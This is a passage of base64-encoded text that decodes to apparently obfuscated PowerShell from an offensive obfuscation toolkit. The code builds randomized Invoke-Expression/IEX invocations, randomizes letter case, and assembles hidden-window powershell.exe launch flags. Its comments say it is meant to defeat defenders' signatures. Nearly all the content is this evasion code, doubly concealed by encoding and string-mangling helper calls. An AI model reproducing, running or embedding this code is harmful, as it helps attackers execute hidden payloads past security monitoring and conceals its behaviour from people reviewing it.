CeE0xRG55RTNNRWZjNXMwaUVwMVVvMkYoJydWYXJpYWJsZTpPRlMnJykpICsgKHQzaTl0NWVqaUJ4bTFEbnlFM01lRmM1UzBJRXAxVU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgxLDIpKSArICh0M2k5dDVlamlCeG0xRG55RTNtRUZjNXMwaWVQMVVPMkYoJycgJycpKQogICAgJFNldE9mc1ZhckJhY2tTeW50YXggKz0gKEdldC1SYW5kb20gLUlucHV0IEAoKHQzSTl0NWVKaUJ4bTFEbnlFM21FRmM1czBJRXAxVW8yRignU2V0LVZhcmlhYmxlJykpLChUM2k5VDVlSmliWG0xRG55RTNtRWZjNXMwaUVwMXVvMkYoJ1NWJykpLChUM0k5dDVlaklieE0xRG5ZZTNtRUZDNXMwaWVwMVVvMmYoJ1NFVCcpKSkpICsgKHQzSTl0NWVqSWJYbTFEbnlFM01lZkM1czBpRXAxVU8yRignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgxLDIpKSArIChUM0k5dDVFamlCeE0xZE5ZRTNtRUZDNXMwaWVwMXVPMkYoJydPRlMnJykpICsgKFQzaTl0NWVqaWJ4bTFEbnlFM01FZmM1UzBJRVAxdU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgxLDIpKSArIChUM2k5VDVFamlCeE0xRE55RTNNZUZDNXMwSUVwMVVPMmYoJycgJycpKQogICAgJFNldE9mc1ZhckJhY2sgICAgICAgID0gKEdldC1SYW5kb20gLUlucHV0ICRTZXRPZnNWYXJCYWNrU3ludGF4KQoKICAgICMgUmFuZG9taXplIGNhc2Ugb2YgJFNldE9mc1ZhciBhbmQgJFNldE9mc1ZhckJhY2suCiAgICAkU2V0T2ZzVmFyICAgICAgICAgICAgPSAoW0NoYXJbXV0kU2V0T2ZzVmFyICAgICB8IEZvckVhY2gtT2JqZWN0IHskQ2hhciA9ICRfLlRvU3RyaW5nKCkuVG9Mb3dlcigpOyBJZihHZXQtUmFuZG9tIC1JbnB1dCBAKDAuLjEpKSB7JENoYXIgPSAkQ2hhci5Ub1VwcGVyKCl9ICRDaGFyfSkgLUpvaW4gJycKICAgICRTZXRPZnNWYXJCYWNrICAgICAgICA9IChbQ2hhcltdXSRTZXRPZnNWYXJCYWNrIHwgRm9yRWFjaC1PYmplY3QgeyRDaGFyID0gJF8uVG9TdHJpbmcoKS5Ub0xvd2VyKCk7IElmKEdldC1SYW5kb20gLUlucHV0IEAoMC4uMSkpIHskQ2hhciA9ICRDaGFyLlRvVXBwZXIoKX0gJENoYXJ9KSAtSm9pbiAnJwoKICAgICMgbSgpIHRoZSBjb2RlIHRoYXQgd2lsbCBkZWNyeXB0IGFuZCBleGVjdXRlIHRoZSBwYXlsb2FkIGFuZCByYW5kb21seSBzZWxlY3Qgb25lLgogICAgJEJhc2VTY3JpcHRBcnJheSAgPSBAKCkKICAgICRCYXNlU2NyaXB0QXJyYXkgKz0gKHQzSTlUNUVqSUJYbTFEbnlFM21FRmM1UzBJZVAxVW8yZignKCcpKSArICh0M0k5VDVlSmlieG0xRG5ZZTNNRWZjNVMwaUVwMXVPMkYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAodDNJOXQ1ZWpJYnhtMURueUUzTUVmYzVzMElFcDFVTzJmKCcnJykpICsgJHhOVGoydzgxdmogKyAoJ3swfSctZicnLicpICsgJFNwbGl0ICsgJygnICsgKHQzSTlUNWVKaUJ4TTFkblllM21FRmM1czBpZXAxVU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM0k5dDVlSklieE0xZG55RTNtRWZDNXMwaUVwMXVPMkYoJycnKSkgKyAkcE9TR0p6VCArICcnJyArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM2k5dDVFSmlieG0xRE55ZTNtZWZjNXMwSWVwMVVPMmYoJyknKSkgKyAoVDNpOXQ1ZWppYnhtMURueUUzbWVGYzVTMGlFcDFVbzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKFQzaTlUNWVqSWJYTTFETllFM21FRkM1czBJRXAxdU8yRignfCcpKSArIChUM2k5VDVlaklieG0xZG5ZZTNtRWZjNVMwaUVQMVVPMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAkRm9yRWFjaE9iamVjdCArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM0k5dDVlamliWG0xZE5ZZTNtRWZjNXMwaUVwMVVPMkYoJ3snKSkgKyAodDNJOXQ1ZWpJYnhtMWRueWUzbWVGQzVzMGlFcDF1bzJGKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKHQzaTl0NUVKSUJ4bTFEbnlFM21lZkM1czBpZXAxdU8yRignKCcpKSArIChUM2k5dDVlSklCeE0xZG55RTNtRUZDNXMwaUVwMVVPMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAkUmFuZG9tQ29udmVyc2lvblN5bnRheCArICcpJyArICAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoVDNpOXQ1ZWppQlhtMURueWUzTUVmQzVTMGlFcDFVbzJmKCd9JykpICsgKHQzSTl0NWVqaUJ4TTFETnlFM21lRmM1czBJRXAxVU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM0k5dDVlSklCeG0xZG5ZRTNtRUZjNXMwaUVwMVVvMkYoJyknKSkKICAgICRCYXNlU2NyaXB0QXJyYXkgKz0gKHQzSTlUNWVqSUJYbTFkTnlFM01FRmM1czBJZXAxdU8yRignKCcpKSArIChUM2k5dDVFaklCeG0xRE55RTNNZUZjNVMwaUVwMXVvMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoVDNJOXQ1ZWpJQlhtMWROWUUzbWVmYzVTMGlFUDFVTzJmKCcnJykpICsgJFhOVEoydzgxdmogKyAnJycgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAkUmFuZG9tRGVsaW1pdGVyc1RvUHJpbnRGb3JEYXNoU3BsaXQgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAodDNJOXQ1ZWpJYnhtMURuWUUzTUVmQzVzMEllcDFVTzJmKCd8JykpICsgKFQzSTl0NWVqaUJ4TTFETlllM21FRmM1czBJRVAxdW8yRignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICRGb3JFYWNoT2JqZWN0ICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKHQzaTlUNWVqaUJYTTFkbllFM21FZmM1czBpRXAxdW8yZigneycpKSArIChUM2k5dDVlSklieG0xZG5ZRTNNRUZDNXMwaUVQMXVvMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoVDNJOXQ1ZUpJQnhNMWRuWUUzTWVmYzVzMEllUDFVTzJmKCcoJykpICsgKHQzaTl0NUVKSUJ4bTFEbnlFM21FZmM1czBJZVAxdU8yRignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICRSYW5kb21Db252ZXJzaW9uU3ludGF4ICsgJyknICsgICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM0k5dDVlSkliWG0xZG55RTNNRWZjNXMwaUVwMVVPMmYoJ30nKSkgKyAoVDNJOXQ1RWpJQnhNMWRueUUzbUVGYzVzMGllcDF1bzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKFQzSTl0NUVKaUJ4bTFEbnlFM21FZmM1czBpZVAxVU8yZignKScpKQogICAgJEJhc2VTY3JpcHRBcnJheSArPSAodDNJOXQ1ZUpJYnhtMURueUUzbUVGYzVzMElFUDF1TzJmKCcoJykpICsgKFQzaTl0NWVqSUJ4TTFEbnlFM21lZmM1czBpZXAxVW8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICRFbmNvZGVkQXJyYXkgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoVDNJOVQ1ZWppYlhtMURueUUzbUVGYzVTMEllcDFVTzJmKCd8JykpICsgKHQzSTlUNWVqSUJ4TTFEbnllM21FZmM1czBpZXAxVU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICRGb3JFYWNoT2JqZWN0ICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKFQzSTl0NUVKaUJ4TTFETnlFM21lZmM1czBJZXAxdU8yZigneycpKSArIChUM2k5VDVlSklCWE0xZG55RTNtRWZDNXMwSUVwMVVPMkYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAodDNJOXQ1ZWppYnhNMURuWWUzbUVmYzVTMGlFcDFVTzJmKCcoJykpICsgKFQzaTl0NUVKSUJYbTFkTnlFM21FZmM1UzBJZXAxVW8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICRSYW5kb21Db252ZXJzaW9uU3ludGF4ICsgJyknICsgICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChUM0k5VDVlamliWG0xRE55RTNtRWZjNVMwSWVQMVVPMmYoJ30nKSkgKyAoVDNJOXQ1ZUppQlhtMURueUUzbUVmQzVzMGllcDFVTzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgKFQzSTlUNUVKaUJ4TTFEbnlFM01lRmM1czBpRVAxdU8yZignKScpKQogICAgCiAgICAjIG0oKSByYW5kb20gSk9JTiBzeW50YXggZm9yIGFsbCBhYm92ZSBvcHRpb25zLgogICAgJE5ld1NjcmlwdEFycmF5ICAgPSBAKCkKICAgICROZXdTY3JpcHRBcnJheSAgKz0gKEdldC1SYW5kb20gLUlucHV0ICRCYXNlU2NyaXB0QXJyYXkpICsgJyAnKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgJEpvaW4gKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAodDNJOXQ1ZWpJQnhtMWROeWUzbUVGQzVzMGlFUDFVTzJmKCcnJycpKQogICAgJE5ld1NjcmlwdEFycmF5ICArPSAkSm9pbiArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChHZXQtUmFuZG9tIC1JbnB1dCAkQmFzZVNjcmlwdEFycmF5KQogICAgJE5ld1NjcmlwdEFycmF5ICArPSAkU3RySm9pbiArICcoJyArIChUM0k5dDVlSmlCeG0xRE5ZRTNtZWZjNXMwaWVwMVVvMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAodDNJOXQ1ZWppQlhtMWRuWUUzTWVmYzVTMGllUDFVbzJGKCcnJycpKSArIChUM0k5VDVlaklieE0xRG55ZTNNZUZjNXMwaUVQMXVPMmYoJyAnKSkqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoVDNJOXQ1ZUpJQlhNMWRueUUzTUVmYzVzMEllUDFVTzJmKCcsJykpICsgKFQzSTlUNWVqSUJYTTFEbnllM21lZmM1UzBpZVAxVW8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArIChHZXQtUmFuZG9tIC1JbnB1dCAkQmFzZVNjcmlwdEFycmF5KSArICcgJyooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICh0M0k5VDVlaklieG0xZG55RTNNRUZDNXMwaUVwMVVPMmYoJyknKSkKCiAgICAjJGVudjp0ZW1wCiAgICAjIFJhbmRvbWx5IHNlbGVjdCBvbmUgb2YgdGhlIGFib3ZlIGNvbW1hbmRzLgogICAgJE5ld1NjcmlwdCA9IChHZXQtUmFuZG9tIC1JbnB1dCAkTmV3U2NyaXB0QXJyYXkpCgogICAgIyBtKCkgcmFuZG9tIGludm9rZSBvcGVyYXRpb24gc3ludGF4LgogICAgIyBCZWxvdyBjb2RlIGJsb2NrIGlzIGEgY29weSBmcm9tIE91dC1PYmZ1c2NhdGVkU3RyaW5nQ29tbWFuZC5wczEuIEl0IGlzIGNvcGllZCBpbnRvIHRoaXMgZW5jb2RpbmcgZnVuY3Rpb24gc28gdGhhdCB0aGlzIHdpbGwgcmVtYWluIGEgc3RhbmRhbG9uZSBzY3JpcHQgd2l0aG91dCBkZXBlbmRlbmNpZXMuCiAgICAkSW52b2tlRXhwcmVzc2lvblN5bnRheCAgPSBAKCkKICAgICRJbnZva2VFeHByZXNzaW9uU3ludGF4ICs9IChHZXQtUmFuZG9tIC1JbnB1dCBAKCh0M0k5dDVlaklieE0xZG55RTNNRWZjNXMwaUVwMXVPMmYoJ0lFWCcpKSwoVDNJOXQ1ZWpJYlhtMURueUUzbUVGQzVzMGllcDFVTzJmKCdJbnZva2UtRXhwcmVzc2lvbicpKSkpCiAgICAjIEFkZGVkIGJlbG93IHNsaWdodGx5LXJhbmRvbWl6ZWQgb2JmdXNjYXRlZCB3YXlzIHRvIGZvcm0gdGhlIHN0cmluZyAnaWV4JyBhbmQgdGhlbiBpbnZva2UgaXQgd2l0aCAuIG9yICYuCiAgICAjJGVudjp0ZW1wCiAgICAjIFRob3VnaCBmYXIgZnJvbSBmdWxseSBidWlsdCBvdXQsIHRoZXNlIGFyZSBpbmNsdWRlZCB0byBoaWdobGlnaHQgaG93IElFWC9JbnZva2UtRXhwcmVzc2lvbiBpcyBhIGdyZWF0IGluZGljYXRvciBidXQgbm90IGEgc2lsdmVyIGJ1bGxldC4KICAgICMgVGhlc2UgbWV0aG9kcyBkcmF3IG9uIGNvbW1vbiBlbnZpcm9ubWVudCB2YXJpYWJsZSB2YWx1ZXMgYW5kIFBvd2VyU2hlbGwgQXV0b21hdGljIFZhcmlhYmxlIHZhbHVlcy9tZXRob2RzL21lbWJlcnMvcHJvcGVydGllcy9ldGMuCiAgICAkSW52b2NhdGlvbk9wZXJhdG9yID0gKEdldC1SYW5kb20gLUlucHV0IEAoKFQzSTl0NWVqSUJYbTFEbnlFM01lRkM1UzBpRXAxVW8yRignLicpKSwodDNJOXQ1ZWpJYnhtMUROeUUzbWVmYzVzMElFcDFVTzJmKCcmJykpKSkgKyAoVDNJOXQ1RUpJQlhtMWRuWUUzbUVGQzVTMGlFcDFVbzJmKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpCiAgICAkSW52b2tlRXhwcmVzc2lvblN5bnRheCArPSAkSW52b2NhdGlvbk9wZXJhdG9yICsgKCd7KCgzIC0gMSkgKiA0KX17N317KChbaW50XSg2IC8gMikpICogKDQgLSAyKSl9ezl9eygxIC0gKDIgLSAxKSl9ezF9eyg1IC0gKDQgLSAyKSl9eygoW2ludF0oMjQgLyAzKSkgLSAoMyArIDApKX17Mn17KCg0IC0gMikgKiAyKX17KDIgKiAoLTQgKyA5KSl9Jy1mJzFdKycsJ2AkU21KbDFNSDFNTGtsJywnWygxICogKDI3IC0gMTQpKScsJ2hlbCcsJ10rJycsJ2xJZCcsJ2VsbCcsJyRTaCcsJyggYCcsJ0lkWycsJ3gnKScpCiAgICAkSW52b2tlRXhwcmVzc2lvblN5bnRheCArPSAkSW52b2NhdGlvbk9wZXJhdG9yICsgKCd7KDkgLSA0KX17KDIgKyAoLTEgKyAyKSl9eygxIC0gKDMgLSAyKSl9eygoNCAtIDIpICogKDMgLSAxKSl9ezJ9eygtKDMgLSAyKSArICgzIC0gMSkpfSctZidQUycsJ1snLCdtZScsJ2AkZGlhc05pcnpTajdCJywnSG8nLCcoICcpICsgKEdldC1SYW5kb20gLUlucHV0IEAoNCwyMSkpICsgKHQzSTl0NWVKSUJ4bTFEbllFM01lRkM1UzBpRXAxdW8yRignXStgJFBzaG9NZVsnKSkgKyAoR2V0LVJhbmRvbSAtSW5wdXQgQCgzMCwzNCkpICsgKHQzSTlUNWVqSWJ4bTFETlllM21lZkM1czBpRXAxdU8yZignXSsneCcpJykpCiAgICAkSW52b2tlRXhwcmVzc2lvblN5bnRheCArPSAkSW52b2NhdGlvbk9wZXJhdG9yICsgKCd7KDIgKiAyKX17KDEgKiA1KX17Mn17MX17MH17M30nLWYncGVjJywnb21TJywndjpDJywnWygyICogMiksJywnKCBgJywnJGwwUVdoSjExRWYxVEhwJykgKyAoR2V0LVJhbmRvbSAtSW5wdXQgQCgxNSwyNCwyNikpICsgKFQzSTl0NWVqaUJYTTFEbnlFM01FZmM1czBJRVAxVU8yZignLCgtKDAgKyAxKSArIDI2KV0tSm9pbicnKScpKQogICAgJEludm9rZUV4cHJlc3Npb25TeW50YXggKz0gJEludm9jYXRpb25PcGVyYXRvciArICgnezB9Jy1mJygoJykgKyAoR2V0LVJhbmRvbSAtSW5wdXQgQCgoVDNpOVQ1RWppQlhNMWROWWUzbUVGQzVTMGlFUDFVbzJmKCdHZXQtVmFyaWFibGUnKSksKHQzaTl0NUVqSUJYbTFkbllFM01FZkM1czBpRXAxdU8yRignR1YnKSksKHQzSTlUNWVKaUJ4bTFEbllFM01FZmM1czBJZXAxVW8yRignVmFyaWFibGUnKSkpKSArIChUM2k5dDVlaklCeG0xRG5ZRTNtZUZjNXMwSWVQMVVPMmYoJyAnKm1kcionKS5OYW1lWyhbaW50XSgoLTQgKyAxMykgLyAoMCArIDMpKSksKDEgKiAoMTggLSA3KSksMl0tSm9pbicnKScpKQogICAgJEludm9rZUV4cHJlc3Npb25TeW50YXggKz0gJEludm9jYXRpb25PcGVyYXRvciArICgneygoMSAtIDEpICsgMCl9ezF9Jy1mJygnLCcgJykgKyAoR2V0LVJhbmRvbSAtSW5wdXQgQCgoVDNJOVQ1ZWpJYnhtMUROWUUzbWVmQzVzMGlFUDF1bzJGKCckb3pSbGVzVUJrSzdrc2VQQjR3eGUuVG9TdHJpbmcoKScpKSwodDNJOXQ1ZWpJQnhtMUROWUUzbUVmYzVzMElFcDFVbzJGKCcoW1N0cmluZ10kb3pSbGVTdUJrSzdrU2VwYjRXeGUpJykpKSkgKyAoJ3soMSAtIDEpfXsxfXsyfSctZidbKDMgLSAyKSwoLSgxICsgMSkgKyAoW2ludF0oMTAgLyAyKSkpXSsnLCcneCctSm8nLCdpbicnKScpCiAgICAjIENvbW1lbnRpbmcgYmVsb3cgb3B0aW9uIHNpbmNlICRlbnY6UHVibGljIGRpZmZlcnMgaW4gc3RyaW5nIHZhbHVlIGZvciBub24tRW5nbGlzaCBvcGVyYXRpbmcgc3lzdGVtcy4KICAgICMkSW52b2tlRXhwcmVzc2lvblN5bnRheCArPSAkSW52b2NhdGlvbk9wZXJhdG9yICsgIiggYCRlbnY6UHVibGljWzEzXStgJGVudjpQdWJsaWNbNV0rJ3gnKSIKCiAgICAjIFJhbmRvbWx5IGNob29zZSBmcm9tIGFib3ZlIGludm9rZSBvcGVyYXRpb24gc3ludGF4ZXMuCiAgICAkSW52b2tlRXhwcmVzc2lvbiA9IChHZXQtUmFuZG9tIC1JbnB1dCAkSW52b2tlRXhwcmVzc2lvblN5bnRheCkKCiAgICAjJGVudjp0ZW1wCiAgICAjIFJhbmRvbWl6ZSB0aGUgY2FzZSBvZiBzZWxlY3RlZCBpbnZva2Ugb3BlcmF0aW9uLgogICAgJEludm9rZUV4cHJlc3Npb24gPSAoW0NoYXJbXV0kSW52b2tlRXhwcmVzc2lvbiB8IEZvckVhY2gtT2JqZWN0IHskQ2hhciA9ICRfLlRvU3RyaW5nKCkuVG9Mb3dlcigpOyBJZihHZXQtUmFuZG9tIC1JbnB1dCBAKDAuLjEpKSB7JENoYXIgPSAkQ2hhci5Ub1VwcGVyKCl9ICRDaGFyfSkgLUpvaW4gJycKICAgIAogICAgIyBDaG9vc2UgcmFuZG9tIEludm9rZS1FeHByZXNzaW9uL0lFWCBzeW50YXggYW5kIG9yZGVyaW5nOiBJRVggKCRTY3JpcHRTdHJpbmcpIG9yICgkU2NyaXB0U3RyaW5nIHwgSUVYKQogICAgJEludm9rZU9wdGlvbnMgID0gQCgpCiAgICAkSW52b2tlT3B0aW9ucyArPSAoVDNJOVQ1ZUppQnhtMUROeUUzbUVmYzVTMGllcDF1TzJGKCcgJykpKihHZXQtUmFuZG9tIC1JbnB1dCBAKDAsMSkpICsgJEludm9rZUV4cHJlc3Npb24gKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoVDNJOVQ1ZWpJQnhNMWRuWUUzTWVGYzVzMGlFcDF1TzJmKCcoJykpICsgKFQzaTl0NWVqSWJ4TTFEblllM01FZmM1UzBpRVAxVU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICROZXdTY3JpcHQgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoVDNpOXQ1ZWpJYlhtMWRuWWUzbWVGYzVzMGlFUDFVTzJGKCcpJykpICsgKFQzSTlUNWVKaWJ4bTFEbnllM21lZmM1czBpRXAxVU8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKQogICAgJEludm9rZU9wdGlvbnMgKz0gKFQzSTl0NWVKSUJ4TTFkbnllM21lZmM1UzBJZVAxVW8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICROZXdTY3JpcHQgKyAnICcqKEdldC1SYW5kb20gLUlucHV0IEAoMCwxKSkgKyAoVDNJOXQ1ZWppQlhtMWROWUUzTUVGYzVTMElFUDFVTzJmKCd8JykpICsgKHQzSTl0NWVKaUJ4bTFEbnlFM21FZmM1UzBJRXAxVW8yZignICcpKSooR2V0LVJhbmRvbSAtSW5wdXQgQCgwLDEpKSArICRJbnZva2VFeHByZXNzaW9uCgogICAgJE5ld1NjcmlwdCA9IChHZXQtUmFuZG9tIC1JbnB1dCAkSW52b2tlT3B0aW9ucykKCiAgICAjIElmIHVzZXIgZGlkIG5vdCBpbmNsdWRlIC1QYXNzVGhydSBmbGFnIHRoZW4gY29udGludWUgd2l0aCBhZGRpbmcgZXhlY3V0aW9uIGZsZ3MgYW5kIHBvd2Vyc2hlbGwuZXhlIHRvICROZXdTY3JpcHQuCiAgICBJZighJFBTQm91bmRQYXJhbWV0ZXJzWygneygyICsgMCl9eygxICsgMil9ezB9eygxICsgMCl9Jy1mJ1RoJywncnUnLCdQYScsJ3NzJyldKQogICAgewogICAgICAgICMgQXJyYXkgdG8gc3RvcmUgYWxsIHNlbGVjdGVkIFBvd2VyU2hlbGwgZXhlY3V0aW9uIGZsYWdzLgogICAgICAgICRQb3dlclNoZWxsRmxhZ3MgPSBAKCkKCiAgICAgICAgIyBCdWlsZCB0aGUgUG93ZXJTaGVsbCBleGVjdXRpb24gZmxhZ3MgYnkgcmFuZG9tbHkgc2VsZWN0aW5nIGV4ZWN1dGlvbiBmbGFncyBzdWJzdHJpbmdzIGFuZCByYW5kb21pemluZyB0aGUgb3JkZXIuCiAgICAgICAgIyRlbnY6dGVtcAogICAgIyBUaGlzIGlzIHRvIHByZXZlbnQgQmx1ZSBUZWFtIGZyb20gcGxhY2luZyBmYWxzZSBob3BlIGluIHNpbXBsZSBzaWduYXR1cmVzIGZvciBjb21tb24gc3Vic3RyaW5ncyBvZiB0aGVzZSBleGVjdXRpb24gZmxhZ3MuCiAgICAgICAgJENvbW1hbmRsaW5lT3B0aW9ucyA9IE5ldy1PYmplY3QgU3RyaW5nW10oMCkKICAgICAgICBJZigkUFNCb3VuZFBhcmFtZXRlcnNbKCd7KDAgKyAoMSAtIDEpKX17KDMgLSAyKX0nLWYnTm9FeCcsJ2l0JyldKQogICAgICAgIHsKICAgICAgICAgICRGdWxsQXJndW1lbnQgPSAoVDNpOVQ1RWpJQnhtMURueUUzbUVmYzVTMGllcDF1bzJGKCctTm9FeGl0JykpOwogICAgICAgICAgJENvbW1hbmRsaW5lT3B0aW9ucyArPSAkRnVsbEFyZ3VtZW50LlN1YlN0cmluZygwLChHZXQtUmFuZG9tIC1NaW5pbXVtIDQgLU1heGltdW0gKCRGdWxsQXJndW1lbnQuTGVuZ3RoKzEpKSkKICAgICAgICB9CiAgICAgICAgSWYoJFBTQm91bmRQYXJhbWV0ZXJzWygnezF9eygxIC0gMSl9Jy1mJ2ZpbGUnLCdOb1BybycpXSkKICAgICAgICB7CiAgICAgICAgICAkRnVsbEFyZ3VtZW50ID0gKFQzaTl0NUVKSUJ4TTFEbllFM21FZkM1czBJRXAxVU8yZignLU5vUHJvZmlsZScpKTsKICAgICAgICAgICRDb21tYW5kbGluZU9wdGlvbnMgKz0gJEZ1bGxBcmd1bWVudC5TdWJTdHJpbmcoMCwoR2V0LVJhbmRvbSAtTWluaW11bSA0IC1NYXhpbXVtICgkRnVsbEFyZ3VtZW50Lkxlbmd0aCsxKSkpCiAgICAgICAgfQogICAgICAgIElmKCRQU0JvdW5kUGFyYW1ldGVyc1soJ3swfXsyfXsoMSArIDApfSctZidOb25JbicsJ3RpdmUnLCd0ZXJhYycpXSkKICAgICAgICB7CiAgICAgICAgICAkRnVsbEFyZ3VtZW50ID0gKFQzSTl0NWVKaWJ4TTFkbnlFM21FZmM1czBJRVAxdU8yRignLU5vbkludGVyYWN0aXZlJykpOwogICAgICAgICAgJENvbW1hbmRsaW5lT3B0aW9ucyArPSAkRnVsbEFyZ3VtZW50LlN1YlN0cmluZygwLChHZXQtUmFuZG9tIC1NaW5pbXVtIDUgLU1heGltdW0gKCRGdWxsQXJndW1lbnQuTGVuZ3RoKzEpKSkKICAgICAgICB9CiAgICAgICAgSWYoJFBTQm91bmRQYXJhbWV0ZXJzWygneygtMSArIDIpfXsoMCArIDApfSctZidnbycsJ05vTG8nKV0pCiAgICAgICAgewogICAgICAgICAgJEZ1bGxBcmd1bWVudCA9IChUM0k5dDVlaklCeE0xRE5ZZTNNRWZjNXMwSUVwMXVvMmYoJy1Ob0xvZ28nKSk7CiAgICAgICAgICAkQ29tbWFuZGxpbmVPcHRpb25zICs9ICRGdWxsQXJndW1lbnQuU3ViU3RyaW5nKDAsKEdldC1SYW5kb20gLU1pbmltdW0gNCAtTWF4aW11bSAoJEZ1bGxBcmd1bWVudC5MZW5ndGgrMSkpKQogICAgICAgIH0KICAgICAgICBJZigkUFNCb3VuZFBhcmFtZXRlcnNbKCd7KDcgLSA0KX17KDIgLSAxKX17KChbaW50XSg4IC8gMikpICsgMSl9eygtMSArIDUpfXswfXsyfSctZid5bCcsJ25kJywnZScsJ1dpJywnU3QnLCdvdycpXSAtT1IgJFdpbmRvd3NTdHlsZSkKICAgICAgICB7CiAgICAgICAgICAgICRGdWxsQXJndW1lbnQgPSAoVDNJOXQ1ZWppQlhtMURueWUzbWVmYzVzMGllcDFVTzJGKCctV2luZG93U3R5bGUnKSkKICAgICAgICAgICAgSWYoJFdpbmRvd3NTdHlsZSkgeyRBcmd1bWVudFZhbHVlID0gJFdpbmRvd3NTdHlsZX0KICAgICAgICAgICAgRWxzZSB7JEFyZ3VtZW50VmFsdWUgPSAkUFNCb3VuZFBhcmFtZXRlcnNbKCd7MX17KCgxICsgMCkgLSAoMyAtIDIpKX0nLWYnU3R5bGUnLCdXaW5kb3cnKV19CgogICAgICAgICAgICAjIFJhbmRvbWx5IGRlY2lkZSB0byB3cml0ZSBXaW5kb3dTdHlsZSB2YWx1ZSB3aXRoIGZsYWcgc3Vic3RyaW5nIG9yIGludGVnZXIgdmFsdWUuCiAgICAgICAgICAgIFN3aXRjaCgkQXJndW1lbnRWYWx1ZS5Ub0xvd2VyKCkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICgneygoMSAqIDUpIC0gMyl9eyhbaW50XSgxNSAvIDMpKX17KC0oMiArIDIpICsgKC0zICsgMTEpKX17MX17KC0oLTIgKyA0KSArICgxMCAtIDUpKX17KDEgLSAxKX0nLWYnbCcsJ20nLCduJywnYScsJ3InLCdvJykgICAge0lmKEdldC1SYW5kb20gLUlucHV0IEAoMC4uMSkpIHskQXJndW1lbnRWYWx1ZSA9IChHZXQtUmFuZG9tIC1JbnB1dCBAKChUM2k5dDVlSmlCeG0xRE55RTNtZWZjNXMwaWVwMVVPMmYoJygwICsgMCknKSksKFQzSTl0NWVqaUJ4TTFETnllM01FRmM1czBJZVAxVU8yZignbicpKSwoVDNJOXQ1ZUppYlhtMWROeUUzTUVmYzVzMGlFcDF1TzJmKCdubycpKSwodDNJOVQ1ZWpJYlhNMWRueUUzTUVmQzVzMElFUDFVTzJmKCdub3InKSksKFQzSTl0NUVKSWJ4TTFEbnllM21lZmM1czBJZVAxVU8yZignbm9ybScpKSwodDNJOVQ1RWppYnhtMUROeWUzbUVmYzVTMGlFcDF1bzJGKCdub3JtYScpKSkpfX0KICAgICAgICAgICAgICAgICgneygwICsgMCl9eygyIC0gMSl9Jy1mJ2hpZCcsJ2RlbicpICAgIHtJZihHZXQtUmFuZG9tIC1JbnB1dCBAKDAuLjEpKSB7JEFyZ3VtZW50VmFsdWUgPSAoR2V0LVJhbmRvbSAtSW5wdXQgQCgoVDNpOXQ1RWppQlhNMURuWWUzbUVGYzVzMGllUDF1bzJGKCcoKC0xICsgNCkgLSAyKScpKSwoVDNJOXQ1RWppQnhNMUROeUUzTUVGYzVTMGlFcDF1bzJmKCdoJykpLCh0M0k5dDVlaklCeG0xZG55RTNNRUZjNVMwaWVwMXVPMkYoJ2hpJykpLChUM0k5dDVlSklCWE0xZG55ZTNtRWZjNXMwSUVwMVVPMmYoJ2hpZCcpKSwoVDNJOVQ1ZUp